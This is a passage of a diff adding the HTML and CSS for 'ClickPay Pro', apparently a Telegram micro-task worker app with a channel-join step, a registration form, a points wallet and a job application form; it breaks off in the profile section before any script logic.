@@ -1,0 +1,1793 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickPay Pro - Worker Ecosystem</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: #05050f;
+            --card-bg: #0e1124;
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --text-light: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #1e2238;
+            --accent: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --glow: rgba(99, 102, 241, 0.35);
+            --gradient-main: linear-gradient(135deg, #6366f1 0%, #a855f7 50%, #ec4899 100%);
+            --gradient-banner: linear-gradient(135deg, #3b82f6 0%, #6366f1 50%, #8b5cf6 100%);
+            --glass-bg: rgba(14, 17, 36, 0.92);
+        }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-light);
+            padding-bottom: 110px;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        #intro-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #0f172a 0%, #030712 100%);
+            z-index: 99999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 24px;
+            animation: cinematicFadeOut 0.8s cubic-bezier(0.16, 1, 0.3, 1) 3.6s forwards;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        @keyframes cinematicFadeOut {
+            to { opacity: 0; visibility: hidden; transform: scale(1.08); filter: blur(12px); }
+        }
+        .intro-laser-grid {
+            position: absolute;
+            width: 200%; height: 200%;
+            background-image: linear-gradient(rgba(99, 102, 241, 0.07) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(99, 102, 241, 0.07) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: gridMove 20s linear infinite;
+        }
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(40px, 40px); }
+        }
+        .intro-logo-box {
+            font-size: 42px;
+            font-weight: 900;
+            background: var(--gradient-main);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            animation: holoPulse 1.6s cubic-bezier(0.16, 1, 0.3, 1) infinite alternate;
+            z-index: 2;
+        }
+        @keyframes holoPulse {
+            0% { transform: scale(0.92); filter: drop-shadow(0 0 15px rgba(99,102,241,0.5)); }
+            100% { transform: scale(1.08); filter: drop-shadow(0 0 45px rgba(168,85,247,0.85)); }
+        }
+        .intro-subtitle {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 14px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            font-weight: 900;
+            z-index: 2;
+        }
+        .intro-brand-launch {
+            font-size: 10px;
+            background: rgba(99, 102, 241, 0.15);
+            border: 1px solid var(--primary);
+            color: var(--text-light);
+            padding: 6px 16px;
+            border-radius: 20px;
+            margin-top: 16px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            z-index: 2;
+        }
+        .intro-loader-bar {
+            width: 200px;
+            height: 3px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+            margin-top: 24px;
+            overflow: hidden;
+            z-index: 2;
+        }
+        .intro-loader-progress {
+            width: 0%;
+            height: 100%;
+            background: var(--gradient-main);
+            animation: loadProgress 3.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        @keyframes loadProgress {
+            to { width: 100%; }
+        }
+
+        header {
+            background: var(--glass-bg);
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+        }
+
+        header h1 { 
+            font-size: 13px; 
+            color: var(--primary); 
+            font-weight: 900; 
+            text-transform: uppercase; 
+            letter-spacing: 1.2px; 
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        header h1 span.sub-brand {
+            font-size: 8px;
+            color: var(--text-muted);
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: none;
+        }
+
+        .container { max-width: 600px; margin: 16px auto; padding: 0 14px; }
+        .section { display: none; animation: fadeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1); }
+        .section.active { display: block; }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(10px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+
+        .section-title {
+            font-size: 13px;
+            margin-bottom: 14px;
+            color: var(--primary);
+            font-weight: 800;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            transition: transform 0.25s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.25s, box-shadow 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 4px; height: 100%;
+            background: var(--primary);
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+        .card:hover {
+            border-color: var(--primary);
+            box-shadow: 0 15px 35px var(--glow);
+            transform: translateY(-2px);
+        }
+        .card:hover::before { opacity: 1; }
+
+        .action-btn {
+            background: var(--gradient-main);
+            color: #ffffff;
+            border: none;
+            padding: 13px 20px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 6px 20px var(--glow);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .action-btn:hover { filter: brightness(1.1); transform: translateY(-2px); box-shadow: 0 8px 25px var(--glow); }
+        .action-btn:active { transform: scale(0.97); }
+        .action-btn.secondary { background: var(--border); color: var(--text-light); border: 1px solid rgba(255,255,255,0.08); box-shadow: none; }
+        .action-btn.secondary:hover { background: #334155; }
+        .action-btn.danger { background: var(--danger); box-shadow: 0 6px 20px rgba(239, 68, 68, 0.3); }
+        .action-btn:disabled { background: #1e293b; color: #475569; cursor: not-allowed; transform: none; box-shadow: none; filter: none; }
+
+        .box {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px;
+            margin-top: 16px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+        }
+
+        .form-group { margin-bottom: 16px; }
+        label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.8px; }
+        input, select, textarea {
+            width: 100%;
+            padding: 13px 16px;
+            background: rgba(0, 0, 0, 0.45);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: white;
+            font-size: 13px;
+            transition: all 0.25s;
+        }
+        input:focus, select:focus, textarea:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px var(--glow); background: rgba(0,0,0,0.6); }
+
+        /* Custom Animated Education Dropdown */
+        .custom-dropdown-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        .dropdown-select-trigger {
+            background: rgba(0, 0, 0, 0.45);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 13px 16px;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        .dropdown-select-trigger:hover {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--glow);
+        }
+        .dropdown-options-container {
+            position: absolute;
+            top: calc(100% + 6px);
+            left: 0;
+            width: 100%;
+            background: #0e1124;
+            border: 1px solid var(--primary);
+            border-radius: 14px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            z-index: 999;
+            display: none;
+            flex-direction: column;
+            gap: 4px;
+            padding: 6px;
+            animation: dropdownSlide 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        @keyframes dropdownSlide {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .dropdown-option-item {
+            padding: 11px 14px;
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-light);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .dropdown-option-item:hover {
+            background: var(--gradient-main);
+            color: #fff;
+            box-shadow: 0 4px 15px var(--glow);
+            transform: translateX(4px);
+        }
+        .dropdown-option-item.selected {
+            background: rgba(99, 102, 241, 0.25);
+            color: var(--primary);
+            border: 1px solid var(--primary);
+        }
+
+        .inline-alert { background: rgba(239, 68, 68, 0.15); border: 1px solid var(--danger); color: #fca5a5; padding: 12px; border-radius: 12px; font-size: 11px; margin-top: 12px; text-align: center; font-weight: bold; display: none; }
+        .inline-success { background: rgba(16, 185, 129, 0.15); border: 1px solid #10b981; color: #6ee7b7; padding: 12px; border-radius: 12px; font-size: 11px; margin-top: 12px; text-align: center; font-weight: bold; display: none; }
+
+        .notice-board {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(168, 85, 247, 0.08));
+            border: 1px solid var(--primary);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 18px;
+            box-shadow: 0 8px 25px var(--glow);
+            position: relative;
+            overflow: hidden;
+        }
+        .notice-board::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: var(--gradient-main);
+        }
+        .notice-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 11px;
+            font-weight: 900;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .notice-content {
+            font-size: 12px;
+            line-height: 1.6;
+            color: var(--text-light);
+            font-weight: 600;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        .wallet-card {
+            background: linear-gradient(135deg, #0d122b, #1b2245, #080c1e);
+            border: 1px solid var(--primary);
+            border-radius: 24px;
+            padding: 24px;
+            margin-bottom: 12px;
+            box-shadow: 0 20px 50px rgba(99,102,241,0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            top: -70px; right: -70px;
+            width: 160px; height: 160px;
+            background: var(--primary);
+            opacity: 0.25;
+            border-radius: 50%;
+            filter: blur(35px);
+        }
+        .wallet-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .wallet-chip { width: 42px; height: 30px; background: linear-gradient(135deg, #a855f7, #6366f1); border-radius: 6px; box-shadow: 0 3px 12px rgba(168,85,247,0.5); }
+        .wallet-balances { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; text-align: center; background: rgba(0,0,0,0.55); padding: 14px; border-radius: 16px; border: 1px solid var(--border); margin-bottom: 16px; }
+        .wallet-bal-box h4 { font-size: 9px; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.6px; }
+        .wallet-bal-box div { font-size: 14px; font-weight: 900; color: var(--primary); }
+
+        .dynamic-banner {
+            background: var(--gradient-banner);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            min-height: 60px;
+            box-shadow: 0 10px 35px rgba(99, 102, 241, 0.5);
+            position: relative;
+            overflow: hidden;
+            animation: bannerGradientPulse 6s ease infinite alternate;
+        }
+        @keyframes bannerGradientPulse {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(45deg); }
+        }
+        .banner-label {
+            font-size: 10px;
+            font-weight: 900;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 6px 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        .banner-dynamic-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            font-weight: 900;
+            color: #ffffff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            animation: fadeInOut 0.4s ease;
+        }
+        @keyframes fadeInOut {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .social-logo-svg {
+            width: 26px; height: 26px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 12px rgba(255,255,255,0.4);
+            font-size: 14px;
+        }
+
+        .gateway-chooser {
+            background: radial-gradient(circle at center, rgba(99,102,241,0.15) 0%, rgba(5,7,18,0.98) 100%);
+            border: 1px solid var(--border);
+            border-radius: 26px;
+            padding: 32px 20px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.7);
+        }
+
+        .promo-badge-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(59, 130, 246, 0.2));
+            border: 1px solid var(--accent);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 900;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2);
+        }
+
+        .nav-bar {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: var(--glass-bg);
+            border-top: 1px solid var(--border);
+            display: flex; justify-content: space-around;
+            padding: 10px 4px 16px; z-index: 1000;
+            box-shadow: 0 -15px 35px rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+        }
+        .nav-item {
+            background: none; border: none; color: var(--text-muted);
+            font-size: 9px; font-weight: 700; cursor: pointer;
+            display: flex; flex-direction: column; align-items: center; gap: 3px;
+            padding: 6px; border-radius: 12px; flex: 1; transition: all 0.2s;
+            text-decoration: none;
+        }
+        .nav-item span:first-child { font-size: 20px; }
+        .nav-item.active { color: var(--primary); font-weight: 900; background: var(--glow); }
+
+        .toast {
+            position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-30px);
+            background: rgba(15, 23, 42, 0.98); color: white; padding: 14px 26px; border-radius: 14px;
+            border: 1px solid var(--primary); font-size: 12px; font-weight: 800; z-index: 2000;
+            opacity: 0; transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1); pointer-events: none;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        
+        .footer-copyright {
+            text-align: center;
+            font-size: 10px;
+            color: var(--text-muted);
+            margin-top: 24px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 700;
+        }
+
+        .option-group {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 6px;
+        }
+        .option-btn {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            padding: 10px 6px;
+            border-radius: 10px;
+            font-size: 10px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+        }
+        .option-btn.selected {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: white;
+            box-shadow: 0 0 15px var(--glow);
+        }
+    </style>
+</head>
+<body>
+
+    <div id="intro-screen">
+        <div class="intro-laser-grid"></div>
+        <div class="intro-logo-box">ClickPay Pro</div>
+        <div class="intro-subtitle">Worker Edition • Micro-Task Ecosystem</div>
+        <div class="intro-brand-launch">Launched by ClickPay Digital</div>
+        <div class="intro-loader-bar">
+            <div class="intro-loader-progress"></div>
+        </div>
+    </div>
+
+    <header>
+        <h1>
+            ⚡ CLICKPAY WORKER HUB
+            <span class="sub-brand">Launched by ClickPay Digital</span>
+        </h1>
+        <div style="display:flex; gap:8px; align-items:center;">
+            <a href="https://t.me/click_Pay_official_Channel" target="_blank" style="font-size:9px; background:linear-gradient(135deg, #2563eb, #1d4ed8); color:#fff; padding:6px 10px; border-radius:8px; font-weight:800; text-decoration:none;">📢 Channel</a>
+            <a href="https://t.me/ZEROPLUSFOR" target="_blank" style="font-size:9px; background:var(--gradient-main); color:#fff; padding:6px 10px; border-radius:8px; font-weight:800; text-decoration:none; box-shadow: 0 4px 15px var(--glow);">💬 Support</a>
+        </div>
+    </header>
+
+    <div id="appToast" class="toast">Message</div>
+
+    <div class="container">
+
+        <div class="notice-board" id="globalNoticeBoard">
+            <div class="notice-header">
+                <span>📢 Live ClickPay Worker Notice Board</span>
+                <span style="font-size: 9px; background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px;" id="noticeSyncTime">Live Sync</span>
+            </div>
+            <div class="notice-content" id="noticeBoardContent">Loading official worker announcements & updates...</div>
+        </div>
+
+        <div id="channel-gate-section" class="section active">
+            <div class="gateway-chooser" style="border: 1px solid var(--primary);">
+                <div style="font-size: 20px; font-weight: 900; color: var(--primary); margin-bottom: 8px;">WORKER TELEGRAM GATEWAY</div>
+                <div style="font-size: 12px; line-height: 1.6; color: var(--text-muted); margin-bottom: 24px;">
+                    Mandatory requirement! Please join our official Telegram channel and start our official bot before registration.
+                </div>
+                <div style="display: flex; flex-direction: column; gap: 12px;">
+                    <a href="https://t.me/click_Pay_official_Channel" target="_blank" class="action-btn secondary" onclick="markJoined('channel')">📢 1. Join Official Channel</a>
+                    <a href="https://t.me/CLIKPAY_BOT" target="_blank" class="action-btn secondary" onclick="markJoined('bot')">🤖 2. Start Telegram Bot</a>
+                    <button class="action-btn" style="width:100%; padding:15px; margin-top:8px;" onclick="proceedAfterGateway()">✅ Proceed to Registration</button>
+                </div>
+                <div id="gateAlert" class="inline-alert">⚠️ Please complete all mandatory gateway requirements!</div>
+                
+                <div class="footer-copyright" style="margin-top: 30px;">
+                    © 2026 ClickPay Pro. All Rights Reserved.
+                </div>
+            </div>
+        </div>
+
+        <div id="auth-section" class="section">
+            <div class="box">
+                <div class="section-title"><span>🔐 Worker Registration</span></div>
+                
+                <div class="form-group"><label>Full Name</label><input type="text" id="regFullName" placeholder="Enter your full name..."></div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                    <div class="form-group">
+                        <label>Age</label>
+                        <input type="number" id="regAge" placeholder="24" min="13" max="99">
+                    </div>
+                    <div class="form-group">
+                        <label>Gender</label>
+                        <select id="regGender">
+                            <option value="">Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group"><label>Email Address</label><input type="email" id="regEmail" placeholder="example@gmail.com"></div>
+                <div class="form-group"><label>Phone Number</label><input type="text" id="regPhone" placeholder="09xxxxxxxx"></div>
+                <div class="form-group"><label>Telegram Username</label><input type="text" id="regTgUser" placeholder="@username"></div>
+                
+                <button class="action-btn" style="width:100%; padding:15px; margin-top:14px;" onclick="handleUserRegistration()">Register & Launch Hub</button>
+                <div id="authAlertBox" class="inline-alert">Please fill in ALL required fields correctly (Valid Email & Phone) before proceeding!</div>
+            </div>
+            <div class="footer-copyright">
+                © 2026 ClickPay Pro. All Rights Reserved.
+            </div>
+        </div>
+
+        <div id="worker-dashboard" class="section">
+            <div style="font-size: 13px; font-weight: bold; color: var(--primary); margin-bottom: 14px; background: rgba(14, 17, 36, 0.9); padding: 16px; border-radius: 18px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; box-shadow: 0 10px 30px rgba(99,102,241,0.2);">
+                <div>
+                    👷 <span id="dashWorkerFullName" style="color: #fff; font-weight: 900;">--</span>
+                    <div style="margin-top: 4px; display: inline-flex; align-items: center; gap: 4px; background: rgba(16, 185, 129, 0.15); border: 1px solid var(--accent); padding: 2px 8px; border-radius: 6px; font-size: 9px; color: var(--accent); font-weight: 900;">
+                        ✓ Verified Worker
+                    </div>
+                </div>
+                <span style="font-size: 10px; background: var(--gradient-main); color: #fff; padding: 5px 12px; border-radius: 10px; font-weight:900; letter-spacing: 0.8px; box-shadow: 0 4px 15px var(--glow);">CLICKPAY BOOST POST</span>
+            </div>
+            
+            <div class="wallet-card">
+                <div class="wallet-header">
+                    <div>
+                        <div style="font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; font-weight: 800;">ClickPay Secure Wallet</div>
+                        <div style="font-size: 17px; font-weight: 900; color: #fff; margin-top: 2px;" id="walletWorkerName">--</div>
+                    </div>
+                    <div class="wallet-chip"></div>
+                </div>
+
+                <div class="wallet-balances">
+                    <div class="wallet-bal-box">
+                        <h4>Points</h4>
+                        <div id="wCardPoints">0 Pts</div>
+                    </div>
+                    <div class="wallet-bal-box">
+                        <h4>ETB Balance</h4>
+                        <div id="wCardEtb">0.00 Br</div>
+                    </div>
+                    <div class="wallet-bal-box">
+                        <h4>USD Value</h4>
+                        <div id="wCardUsd">$0.00</div>
+                    </div>
+                </div>
+
+                <div style="font-size: 10px; color: var(--text-muted); display: flex; justify-content: space-between; font-weight: 700;">
+                    <span>@<span id="walletTgUser">username</span></span>
+                    <span>Joined: <span id="walletRegDate">--</span></span>
+                </div>
+            </div>
+
+            <div class="dynamic-banner" id="rotatingBannerBox">
+                <div class="banner-label">🚀 ClickPay Boost Post</div>
+                <div class="banner-dynamic-content" id="bannerDynamicArea">
+                    <span class="social-logo-svg">📢</span> <span>Telegram Channel Growth</span>
+                </div>
+            </div>
+
+            <div style="display: flex; justify-content: space-between; margin: 16px 0; background: rgba(0,0,0,0.4); border-radius: 16px; padding: 6px; border: 1px solid var(--border); gap: 4px;">
+              <button onclick="switchWorkerTab('tasks')" id="worker-tasks-tab-btn" style="flex: 1; padding: 10px 4px; border: none; background: var(--primary); color: #fff; border-radius: 12px; font-weight: 900; font-size: 11px; cursor: pointer; transition: all 0.2s;">📋 Micro-Tasks</button>
+              <button onclick="switchWorkerTab('promos')" id="worker-promos-tab-btn" style="flex: 1; padding: 10px 4px; border: none; background: transparent; color: var(--text-light); border-radius: 12px; font-weight: 900; font-size: 11px; cursor: pointer; transition: all 0.2s;">🌟 Promotions</button>
+              <button onclick="switchWorkerTab('jobs')" id="worker-jobs-tab-btn" style="flex: 1; padding: 10px 4px; border: none; background: transparent; color: var(--text-light); border-radius: 12px; font-weight: 900; font-size: 11px; cursor: pointer; transition: all 0.2s;">💼 Daily Jobs</button>
+              <button onclick="switchWorkerTab('dailyads')" id="worker-dailyads-tab-btn" style="flex: 1; padding: 10px 4px; border: none; background: transparent; color: var(--text-light); border-radius: 12px; font-weight: 900; font-size: 11px; cursor: pointer; transition: all 0.2s;">📢 Daily Ads</button>
+            </div>
+
+            <div id="worker-tasks-wrap">
+                <div class="section-title"><span>📋 Available Micro-Tasks</span></div>
+                <div id="worker-dynamic-tasks-container">Loading tasks...</div>
+            </div>
+
+            <div id="worker-promos-wrap" style="display: none;">
+                <div class="section-title"><span>🌟 Exclusive Promotions</span></div>
+                <div id="worker-promotions-container">Loading promos...</div>
+            </div>
+
+            <div id="worker-jobs-wrap" style="display: none;">
+                <div class="section-title"><span>💼 Professional Daily Job Directory</span></div>
+                <div id="worker-daily-jobs-container">Loading daily job listings...</div>
+            </div>
+
+            <div id="worker-dailyads-wrap" style="display: none;">
+                <div class="section-title"><span>📢 Daily ClickPay Advertisements</span></div>
+                <div id="worker-daily-ads-container">Loading daily advertisements...</div>
+            </div>
+
+            <div class="footer-copyright">
+                © 2026 ClickPay Pro. All Rights Reserved.
+            </div>
+        </div>
+
+        <div id="job-apply-section" class="section">
+            <div class="section-title"><span>💼 Professional Career Application Portal</span></div>
+            <div class="box">
+                <p style="font-size: 11px; color: var(--text-muted); line-height: 1.6; margin-bottom: 20px; background: rgba(99, 102, 241, 0.08); padding: 12px; border-radius: 12px; border: 1px solid rgba(99, 102, 241, 0.2);">
+                    Apply for professional digital media positions within our ecosystem with your verified credentials. <b>Cost: 0.5 Points</b> per application submission.
+                </p>
+
+                <div class="form-group"><label>Full Name</label><input type="text" id="jobFullName" placeholder="Your full name..."></div>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                    <div class="form-group"><label>Age</label><input type="number" id="jobAge" placeholder="24"></div>
+                    <div class="form-group"><label>Phone Number</label><input type="text" id="jobPhone" placeholder="09xxxxxxxx"></div>
+                </div>
+
+                <div class="form-group"><label>Address / Location</label><input type="text" id="jobAddress" placeholder="Addis Ababa, Ethiopia"></div>
+
+                <div class="form-group">
+                    <label>Work Schedule Type</label>
+                    <div class="option-group" id="jobScheduleGroup" style="grid-template-columns: repeat(3, 1fr);">
+                        <div class="option-btn selected" onclick="selectJobOption('schedule', 'Part-Time', this)">Part-Time</div>
+                        <div class="option-btn" onclick="selectJobOption('schedule', 'Full-Time', this)">Full-Time</div>
+                        <div class="option-btn" onclick="selectJobOption('schedule', 'Remote', this)">Remote</div>
+                        <div class="option-btn" onclick="selectJobOption('schedule', 'Freelance', this)">Freelance</div>
+                        <div class="option-btn" onclick="selectJobOption('schedule', 'Contract', this)">Contract</div>
+                        <div class="option-btn" onclick="selectJobOption('schedule', 'Internship', this)">Internship</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Education Level</label>
+                    <div class="custom-dropdown-wrapper" id="customEduDropdown">
+                        <div class="dropdown-select-trigger" onclick="toggleEduDropdown()">
+                            <span id="selectedEduText">College Diploma</span>
+                            <span style="font-size: 10px; color: var(--primary);">▼</span>
+                        </div>
+                        <div class="dropdown-options-container" id="eduOptionsList">
+                            <div class="dropdown-option-item" onclick="selectEduLevel('10th Grade')">📚 10th Grade Complete</div>
+                            <div class="dropdown-option-item" onclick="selectEduLevel('12th Grade')">📖 12th Grade Preparatory</div>
+                            <div class="dropdown-option-item" onclick="selectEduLevel('Certificate')">📜 Professional Certificate</div>
+                            <div class="dropdown-option-item selected" onclick="selectEduLevel('College Diploma')">🎓 College Diploma</div>
+                            <div class="dropdown-option-item" onclick="selectEduLevel('Bachelor Degree')">🏛️ Bachelor Degree (BSc/BA)</div>
+                            <div class="dropdown-option-item" onclick="selectEduLevel('Master Degree')">🌟 Master Degree & Above</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group"><label>Specialized Professional Skills</label><input type="text" id="jobSkills" placeholder="Graphic Design, Video Editing, Full-Stack Dev..."></div>
+                <div class="form-group"><label>Professional Portfolio Link (TikTok, Facebook, YouTube, Website)</label><input type="url" id="jobPortfolio" placeholder="https://tiktok.com/... or https://youtube.com/..."></div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                    <div class="form-group"><label>Experience (Years)</label><input type="number" id="jobExp" placeholder="2"></div>
+                    <div class="form-group"><label>Expected Salary (ETB)</label><input type="number" id="jobSalary" placeholder="5000" oninput="calculateSalaryEstimate(this.value)"></div>
+                </div>
+
+                <div id="salaryEstimateBox" style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 12px; padding: 12px; margin-bottom: 16px; font-size: 11px; display: none;">
+                    <div style="color: var(--accent); font-weight: 900; margin-bottom: 4px;">💡 Salary Conversion Estimate:</div>
+                    <div style="color: #fff; font-weight: 700;" id="salaryEstimateText">--</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Professional Summary & Motivation</label>
+                    <textarea id="jobDesc" rows="4" placeholder="Detail your professional background, past creative operations, technical proficiencies, and why you are an exceptional fit for our platform..."></textarea>
+                </div>
+
+                <button class="action-btn" style="width:100%; padding:15px; margin-top:8px;" onclick="submitJobApplication()">🚀 Submit Professional Application (-0.5 Pts)</button>
+                <div id="jobAlertBox" class="inline-alert"></div>
+                <div id="jobSuccessBox" class="inline-success">Professional application submitted successfully and sent to official bot!</div>
+            </div>
+            <div class="footer-copyright">
+                © 2026 ClickPay Pro. All Rights Reserved.
+            </div>
+        </div>
+
+        <div id="worker-profile-section" class="section">
+            <div class="section-title"><span>👷 Worker Profile & Official Channels</span></div>
+            <div class="box">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="font-size: 40px; margin-bottom: 8px;">👤</div>
+                    <div style="font-size: 16px; font-weight: 900; color: #fff;" id="workerProfName">--</div>
+                    <div style="display: inline-flex; align-items: center; gap: 4px; background: rgba(16, 185, 129, 0.15); border: 1px solid var(--accent); padding: 4px 12px; border-radius: 8px; font-size: 10px; color: var(--accent); font-weight: 900; margin-top: 6px;">
+                        ✓ Verified Ecosystem Worker
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px; display: flex; flex-direction: column; gap: 10px;">
+                    <a href="https://t.me/click_Pay_official_Channel" target="_blank" class="action-btn" style="width: 100%; text-align: center; text-decoration: none; display: block; background: linear-gradient(135deg, #2563eb, #1d4ed8);">
+                        📢 Join Official Telegram Channel
+                    </a>
+                    <a href="https://t.me/ZEROPLUSFOR" target="_blank" class="action-btn" style="width: 100%; text-align: center; text-decoration: none; display: block; background: var(--gradient-main);">
+                        💬 Contact Support (@ZEROPLUSFOR)
+                    </a>
